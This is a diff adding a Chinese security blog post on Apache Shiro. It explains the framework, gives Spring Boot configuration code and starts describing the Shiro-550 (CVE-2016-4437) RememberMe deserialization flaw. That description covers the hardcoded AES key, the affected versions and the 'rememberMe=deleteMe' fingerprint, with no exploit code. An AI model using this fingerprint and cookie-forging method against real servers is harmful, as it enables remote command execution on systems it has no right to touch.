@@ -167,6 +167,404 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="B3c0me">
+      <meta itemprop="description" content="去爱 去工作">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="THIS IS B3c0me">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Shiro反序列化漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-10 14:34:04 / 修改时间：17:30:13" itemprop="dateCreated datePublished" datetime="2023-09-10T14:34:04+08:00">2023-09-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+
+
+<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本文参考文章为：</p>
+<p>1.CSDN博主「大家都说我身材好」的原创文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/u012581020/article/details/130627795">https://blog.csdn.net/u012581020/article/details/130627795</a></p>
+<p>2.CSDN博主「風月长情」的原创文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106475088">https://blog.csdn.net/Aaron_Miller/article/details/106475088</a></p>
+<p>感谢原创作者让我可以站在巨人的肩膀上乘风破浪</p>
+<h1 id="一、Shiro简介"><a href="#一、Shiro简介" class="headerlink" title="一、Shiro简介"></a>一、Shiro简介</h1><blockquote>
+<p>Shiro 是一款轻量级的 <strong>Java 安全框架</strong>，提供了身份认证、授权、加密和会话管理等功能。它可以<strong>集成到任何 Java Web 应用程序</strong>中，并且易于使用和扩展。Shiro 的设计理念是简洁而灵活，不仅可以应用于 Web 应用程序，还可以<strong>应用于命令行、移动设备和分布式系统</strong>等各种应用场景。</p>
+</blockquote>
+<h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>Shiro 是一个开源的 Java <strong>安全框架</strong>，由 <strong>Apache</strong> 开发和维护。Shiro 可以帮助开发人员快速<strong>实现安全特性</strong>，包括身份认证、授权、加密和会话管理等。Shiro 的目标是简化 Java 安全编程，并提供更好的开发体验。</p>
+<p><strong>Shiro的主要特点：</strong></p>
+<ul>
+<li>易于学习和使用：Shiro 设计简单，易于学习和使用。</li>
+<li>灵活性高：Shiro 可以<strong>适用于任何应用场景</strong>，支持多种应用程序类型。</li>
+<li>安全性高：Shiro 的安全性能比较优越，提供了多种方式来保护应用程序的安全性。</li>
+<li>扩展性好：Shiro 框架提供了<strong>可扩展性插件机制</strong>，可以方便地扩展框架的功能，满足不同的需求。</li>
+<li>企业级支持：Shiro 是从 <strong>Apache 基金会</strong>获得支持的框架，拥有众多企业用户。</li>
+</ul>
+<h2 id="1-2-Shiro-的基本组件"><a href="#1-2-Shiro-的基本组件" class="headerlink" title="1.2 Shiro 的基本组件"></a>1.2 Shiro 的基本组件</h2><p>Shiro 的基本组件包括 <strong>Subject、SecurityManager 和 Realms</strong> 等。下面我们分别介绍一下这些组件的作用。</p>
+<ul>
+<li><strong>Subject</strong></li>
+</ul>
+<p>Subject 代表<strong>当前用户</strong>，是 Shiro 框架中最重要的组件之一。Subject <strong>封装了用户的所有信息</strong>，包括身份（用户名和密码）和角色等。在一个应用程序中，可能有多个 Subject，每个 Subject 可以访问应用程序中的资源。</p>
+<p>用户可以通过 Subject 登录应用程序，并执行诸如访问资源、修改个人配置等操作。Shiro 提供了简单易用的方法来管理用户的登录和退出行为，以及 Session 管理等。</p>
+<ul>
+<li><strong>SecurityManager</strong></li>
+</ul>
+<p>SecurityManager 是 Shiro 的核心组件，负责<strong>管理和协调整个应用程序的安全机制</strong>。它的主要职责是认证、授权、加密和会话管理等。</p>
+<p>SecurityManager 将应用程序中的所有安全操作<strong>委托给适当的 Realms</strong> 进行处理，并存储和管理有关用户身份、角色和权限等信息。SecurityManager 还可以配置多个 Realms，以便应用程序可以集成不同的认证和授权方案。</p>
+<ul>
+<li><strong>Realm</strong></li>
+</ul>
+<p>Realm 是 SecurityManager 中负责<strong>处理用户身份认证和授权</strong>的组件。Shiro 支持多种不同类型的 Realm，包括 JDBC Realm、LDAP Realm、Active Directory Realm 等。</p>
+<p>每个 Realm 负责验证用户的身份，并获取用户的权限信息，以便 SecurityManager 可以根据这些信息进行访问控制和授权。Realm 还可以实现缓存机制，提高系统性能。</p>
+<h2 id="1-3-Shiro-的权限控制"><a href="#1-3-Shiro-的权限控制" class="headerlink" title="1.3 Shiro 的权限控制"></a>1.3 Shiro 的权限控制</h2><p>Shiro 提供了灵活的权限控制机制，可以对应用程序中的资源进行细粒度的访问控制。Shiro 的权限控制基于<strong>角色和权限</strong>的概念，其中：</p>
+<ul>
+<li><strong>角色</strong>是用户的一组角色，可以表示用户在系统中的不同身份；</li>
+<li><strong>权限</strong>是用户针对某个资源或操作所具有的权限。</li>
+</ul>
+<p><strong>Shiro 的权限控制机制包括以下几个步骤：</strong></p>
+<ol>
+<li>用户登录系统，通过 Subject 实例获取当前用户信息；</li>
+<li>当用户进行某个操作时，Shiro 会根据用户请求的资源和操作类型，检查该用户是否具有执行该操作的权限。</li>
+<li>如果用户具备该权限，则允许用户进行操作；否则，Shiro 会拒绝用户的请求，并返回相应的错误信息。</li>
+</ol>
+<p>Shiro 支持多种方式来授权，包括基于角色和基于权限。角色授权是将用户分配到不同的角色，每个角色具有特定的权限，从而实现对用户的授权。权限授权是直接为用户授权某个资源或操作，从而实现对用户的授权。</p>
+<h2 id="1-4-Shiro-的会话管理"><a href="#1-4-Shiro-的会话管理" class="headerlink" title="1.4 Shiro 的会话管理"></a>1.4 Shiro 的会话管理</h2><p>会话管理是 Web 应用程序中一个非常重要的安全特性。Shiro 提供了丰富的会话管理功能，包括 <strong>Cookie 管理、Session 管理和集群会话管理</strong>等。</p>
+<p><strong>Shiro 的会话管理机制包括以下几个步骤：</strong></p>
+<ol>
+<li>当用户登录系统时，Shiro 会自动创建一个 Session 对象，并将其关联到用户身份信息上，以便在整个应用程序生命周期内管理用户的会话状态。</li>
+<li>用户进行某个操作时，Shiro 会检查该用户是否具有执行该操作的权限，并根据情况更新 Session 中的状态信息。</li>
+<li>当用户退出系统时，Shiro 会清除用户的 Session 数据，并删除相关的 Session 记录。</li>
+</ol>
+<p>Shiro 还支持<strong>集群会话管理</strong>，可以通过配置将会话信息存储在数据库、Redis 或其他数据源中，以便在分布式应用程序中进行会话管理。</p>
+<h2 id="1-5-Shiro-的加密与解密"><a href="#1-5-Shiro-的加密与解密" class="headerlink" title="1.5 Shiro 的加密与解密"></a>1.5 Shiro 的加密与解密</h2><p>Shiro 支持多种加密和解密算法，包括 <strong>MD5、SHA、AES</strong> 等。Shiro 不仅提供了简单易用的加密和解密 API，还提供了安全的密码管理和哈希函数实现。</p>
+<p>在 Shiro 中，需要对密码进行加密和解密时，可以使用 Shiro 内置的加密和解密工具类。例如，我们可以使用 CredentialsMatcher 进行密码验证，或者使用 SimpleHash 类进行密码加密。</p>
+<p>Shiro 的密码加密和解密功能的主要目的是保护用户的个人信息和隐私，防止其被黑客攻击和非法访问，从而提高系统的安全性。</p>
+<h2 id="1-6-Shiro-的集成开发"><a href="#1-6-Shiro-的集成开发" class="headerlink" title="1.6 Shiro 的集成开发"></a>1.6 Shiro 的集成开发</h2><p>Shiro 可以与各种 Web 框架和数据源集成，以满足不同应用场景的需求。Shiro 的集成开发可以分为以下三个步骤：</p>
+<ol>
+<li>配置 SecurityManager：首先，需要在应用程序的配置文件中配置 SecurityManager，以便为应用程序提供统一的身份验证和授权管理。</li>
+<li>配置 Realm：其次，需要根据实际需要配置 Realm，以便根据数据库、LDAP 或其他数据源来验证用户身份，并获取用户权限信息。</li>
+<li>配置 FilterChain：最后，需要配置 FilterChain，以便拦截访问请求，并根据用户的角色和权限等信息来判断是否允许用户进行访问。</li>
+</ol>
+<p>在集成开发时，需要使用 Shiro 提供的相应 API 和插件来集成 Shiro 到应用程序中。具体来说，可以根据不同的框架和数据源选择不同的 Shiro 插件。例如，对于 Spring 应用程序，可以使用 Shiro-Spring 插件；对于数据源，可以使用 Shiro-JDBC 插件或 Shiro-LDAP 插件等。</p>
+<h1 id="二、Shiro配置"><a href="#二、Shiro配置" class="headerlink" title="二、Shiro配置"></a>二、Shiro配置</h1><p>首先，在pox.xml中添加依赖项：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring Boot --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- MyBatis + Spring Boot --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Shiro --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Spring Shiro Integration --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- H2 Database --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Test --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上述依赖项中，我们引入了 Spring Boot、MyBatis 和 Shiro 的相关依赖项。</p>
+<p>然后，我们实现一个 UserMapper 接口来操作用户数据：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">User <span class="title">selectByUsername</span><span class="params">(String username)</span></span>;</span><br><span class="line">    <span class="function">Set&lt;String&gt; <span class="title">selectRolesByUsername</span><span class="params">(String username)</span></span>;</span><br><span class="line">    <span class="function">Set&lt;String&gt; <span class="title">selectPermissionByUsername</span><span class="params">(String username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该接口中，我们声明了 selectByUsername、selectRolesByUsername 和 selectPermissionsByUsername 三个方法，用于查询指定用户名的用户、角色和权限信息。</p>
+<p>接下来，我们实现一个 User 实体类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Boolean enabled;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;Role&gt; roles;</span><br><span class="line">    <span class="comment">// getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们定义了 id、username、password、enabled 和 roles 属性。roles 属性为一个 Set 集合，存储用户所拥有的角色信息。</p>
+<p>然后，我们实现一个 Role 实体类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Role</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;Permission&gt; permissions;</span><br><span class="line">    <span class="comment">// getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们定义了 id、name、description 和 permissions 属性。permissions 属性为一个 Set 集合，存储角色所拥有的权限信息。</p>
+<p>最后，我们实现一个 Permission 实体类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Permission</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line">    <span class="comment">// getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们定义了 id、name 和 description 属性，用于存储权限信息。</p>
+<p>接下来，我们需要实现 ShiroConfig 类来完成 Shiro 配置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">securityManager</span><span class="params">(Realm realm)</span> </span>&#123;</span><br><span class="line">        DefaultWebSecurityManager securityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line">        securityManager.setRealm(realm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">realm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        MyShiroRealm myShiroRealm = <span class="keyword">new</span> MyShiroRealm();</span><br><span class="line">        myShiroRealm.setCredentialsMatcher(hashedCredentialsMatcher());</span><br><span class="line">        <span class="keyword">return</span> myShiroRealm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CredentialsMatcher <span class="title">hashedCredentialsMatcher</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HashedCredentialsMatcher credentialsMatcher = <span class="keyword">new</span> HashedCredentialsMatcher();</span><br><span class="line">        credentialsMatcher.setHashAlgorithmName(Sha256Hash.ALGORITHM_NAME);</span><br><span class="line">        credentialsMatcher.setStoredCredentialsHexEncoded(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> credentialsMatcher;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">shiroFilter</span><span class="params">(SecurityManager securityManager)</span> </span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilter = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">        shiroFilter.setSecurityManager(securityManager);</span><br><span class="line">        Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        shiroFilter.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br><span class="line">        shiroFilter.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        shiroFilter.setSuccessUrl(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        shiroFilter.setUnauthorizedUrl(<span class="string">&quot;/unauthorized&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> shiroFilter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们通过 @Bean 注解定义了 Shiro 的安全管理器、Realm、CredentialsMatcher 和过滤器链等相关配置。其中，我们使用 MyShiroRealm 来连接数据库，并设置了密码加密算法为 SHA-256。</p>
+<p>然后，我们可以定义一个 UserController 类来处理用户相关的请求和操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password)</span> </span>&#123;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        UsernamePasswordToken token = <span class="keyword">new</span> UsernamePasswordToken(username, password);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/admin/users&quot;)</span></span><br><span class="line">    <span class="meta">@RequiresRoles(&quot;admin&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">getUsers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.getAllUsers();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们定义了 login 方法用于进行身份认证操作，接受用户名和密码参数，并调用 Shiro 提供的 Subject 对象对用户进行身份认证。如果身份认证成功，则返回字符串 “login success”，否则返回 “login failed”。</p>
+<p>另外，getUsers 方法用于获取所有用户列表，在访问该 URL 时，需要用户具有 admin 角色权限才能访问。我们可以使用 @RequiresRoles 注解来对该方法进行授权管理。</p>
+<p>最后，我们实现一个 UserService 类来操作用户数据：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getByUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectByUsername(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;String&gt; <span class="title">getRolesByUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectRolesByUsername(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;String&gt; <span class="title">getPermissionsByUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectPermissionsByUsername(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">getAllUsers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectAllUsers();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该类中，我们使用 UserMapper 接口来访问数据库，实现了根据用户名获取用户、获取用户角色和权限以及获取所有用户列表的方法。</p>
+<h1 id="三、Shiro漏洞"><a href="#三、Shiro漏洞" class="headerlink" title="三、Shiro漏洞"></a>三、Shiro漏洞</h1><h2 id="3-1-Shiro反序列化导致命令执行（Shiro-550-CVE-2016-4437）"><a href="#3-1-Shiro反序列化导致命令执行（Shiro-550-CVE-2016-4437）" class="headerlink" title="3.1 Shiro反序列化导致命令执行（Shiro-550 CVE-2016-4437）"></a>3.1 Shiro反序列化导致命令执行（Shiro-550 CVE-2016-4437）</h2><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>
+<ol>
+<li>检索RememberMe Cookie的值</li>
+<li>Base 64解码</li>
+<li>AES解密（加密密钥硬编码）</li>
+<li>进行反序列化操作（未过滤处理）</li>
+</ol>
+<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
+<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><ul>
+<li>Apache Shiro &lt; 1.2.4</li>
+</ul>
+<h5 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h5><p>进行登录，返回包中查看是否有rememberMe=deleteMe字段</p>
